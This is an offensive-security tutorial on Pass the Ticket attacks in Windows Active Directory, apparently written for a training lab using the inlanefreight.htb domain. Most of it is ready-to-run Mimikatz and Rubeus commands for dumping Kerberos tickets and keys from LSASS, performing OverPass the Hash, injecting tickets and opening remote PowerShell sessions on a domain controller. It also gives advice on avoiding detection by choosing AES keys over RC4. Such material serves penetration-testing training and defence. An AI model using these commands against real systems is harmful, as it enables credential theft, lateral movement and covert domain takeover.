# Pass the Ticket (PtT) from Windows

[Pass the Ticket (PtT)](https://attack.mitre.org/techniques/T1550/003/) is a Kerberos-based lateral movement technique where a stolen ticket — either a TGT or a TGS — is injected into an active logon session to impersonate the ticket's owner without needing their password or hash. Unlike Pass the Hash which exploits NTLM, PtT abuses the Kerberos ticket system directly and is documented under [MITRE ATT&CK T1550.003](https://attack.mitre.org/techniques/T1550/003/).

## Kerberos Ticket Types

Two types of tickets can be used for lateral movement:

- **Ticket Granting Ticket (TGT)** — issued by the KDC after initial authentication. It allows the holder to request TGS tickets for any service the account has access to. Stealing a TGT gives the broadest access.
- **Ticket Granting Service (TGS)** — issued for a specific service (CIFS, MSSQL, LDAP, etc.). Using a stolen TGS provides access only to that specific resource, but does not require a TGT.

All tickets are stored and managed by the LSASS process. Harvesting them requires communicating with LSASS — as a standard user you can only retrieve your own tickets, but as a local administrator you can dump all tickets for all sessions on the machine.

## Phase 1: Harvesting Tickets

### Mimikatz sekurlsa::tickets

Mimikatz exports all tickets from LSASS as `.kirbi` files to the current working directory:

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

The exported `.kirbi` filenames follow the naming convention:

```
[LUID]-GroupNumber-TicketNumber-Flags-username@service-domain.kirbi
```

Tickets where the service is `krbtgt` are TGTs. All others are TGS tickets. Computer account tickets end in `$`. To quickly confirm you have a TGT:

```cmd
dir *.kirbi | findstr "krbtgt"
```

### Rubeus dump

Rubeus outputs tickets as Base64-encoded strings rather than files, which is easier to transport across a session or into a tool directly:

```cmd
Rubeus.exe dump /nowrap
```

The `/nowrap` flag prevents line breaks in the Base64 output, making copy-paste cleaner. Note: on certain Windows 10 versions, Mimikatz's `sekurlsa::ekeys` may output all keys as `des_cbc_md4`, making the exported `.kirbi` files unusable — in that case, use Rubeus for ticket extraction instead.

## Phase 2: Pass the Key / OverPass the Hash

Before performing a PtT, it is worth understanding the related OverPass the Hash technique. Traditional PtH reuses an NTLM hash over NTLM authentication. OverPass the Hash (also called Pass the Key) takes that same hash — or a Kerberos AES key — and uses it to request a full TGT from the KDC. This converts an NTLM credential into a Kerberos ticket, enabling Kerberos-based lateral movement from a hash alone.

First, extract all Kerberos encryption keys from LSASS using Mimikatz `sekurlsa::ekeys`:

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

This exposes all key types for authenticated users:

```
* Username : plaintext
* Domain   : inlanefreight.htb
* Key List :
  aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
  rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
```

With these keys, OverPass the Hash can be performed two ways:

**Mimikatz (requires local admin):** injects the hash into a new process context via `sekurlsa::pth`. The spawned `cmd.exe` window will use the supplied hash to authenticate to Kerberos and request tickets:

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

**Rubeus (no local admin required on source):** requests a TGT directly from the KDC using the key. Using AES-256 is strongly preferred over RC4 — an RC4-encrypted Kerberos ticket in a domain that normally uses AES-256 produces an "encryption downgrade" detection signature in Windows event logs:

```cmd
# Using AES-256 key (preferred - blends in with normal traffic)
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

# Using RC4/NTLM hash (detectable as encryption downgrade)
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /nowrap
```

## Phase 3: Injecting the Ticket

Once a ticket is obtained — whether harvested directly or generated via OverPass the Hash — it needs to be injected into the current logon session.

### Rubeus ptt (from file)

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Rubeus ptt (from Base64)

Rubeus accepts the Base64 ticket string directly. A `.kirbi` file can be converted to Base64 in PowerShell first if needed:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

Then pass it directly:

```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBa...SNIP...
```

### Rubeus asktgt with /ptt (combined step)

Rubeus can request and immediately inject the TGT in one command using `/ptt`:

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

### Mimikatz kerberos::ptt

Mimikatz imports a `.kirbi` file directly into the current session. Once imported, any command run in that same `cmd.exe` window will use the ticket:

```cmd
mimikatz # kerberos::ptt "C:\tools\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

To launch a new `cmd.exe` with the imported ticket already active without staying inside the Mimikatz console, use `misc::cmd` after the import.

**Verify the ticket was imported successfully:**

```cmd
klist
```

**Test access to the target:**

```cmd
dir \\DC01.inlanefreight.htb\c$
```

## Phase 4: Lateral Movement via PowerShell Remoting

With a ticket injected, [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) (WinRM, port 5985/5986) can be used for interactive access. The ticket transparently handles Kerberos authentication for the session.

### Mimikatz approach

Import the ticket in `cmd.exe`, then launch PowerShell from within the same process to inherit the Kerberos session:

```cmd
mimikatz # kerberos::ptt "C:\tools\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz # exit

C:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01

[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

### Rubeus approach (sacrificial process)

Rubeus `createnetonly` creates a new logon session with [Logon Type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/) (equivalent to `runas /netonly`). This is important because it prevents the injected ticket from overwriting TGTs already present in the current session:

```cmd
# Step 1: Create an isolated logon session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# From the new cmd.exe window that opens:
# Step 2: Request TGT and inject into the new session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

# Step 3: Use the session
powershell
Enter-PSSession -ComputerName DC01
```

## Tool and Method Reference

| Action | Tool | Command |
|---|---|---|
| Export all tickets as .kirbi | Mimikatz | `sekurlsa::tickets /export` |
| Export all tickets as Base64 | Rubeus | `dump /nowrap` |
| Extract all Kerberos keys | Mimikatz | `sekurlsa::ekeys` |
| OverPass the Hash (new process) | Mimikatz | `sekurlsa::pth /user /ntlm /domain` |
| OverPass the Hash (request TGT) | Rubeus | `asktgt /user /aes256:<key> /nowrap` |
| Import .kirbi ticket | Mimikatz | `kerberos::ptt <file>` |
| Import .kirbi or Base64 ticket | Rubeus | `ptt /ticket:<file or base64>` |
| Request TGT and inject in one step | Rubeus | `asktgt ... /ptt` |
| Isolated logon session for PtT | Rubeus | `createnetonly /program:cmd.exe /show` |
| Verify injected tickets | Built-in | `klist` |
| PowerShell Remoting with ticket | Built-in | `Enter-PSSession -ComputerName <host>` |
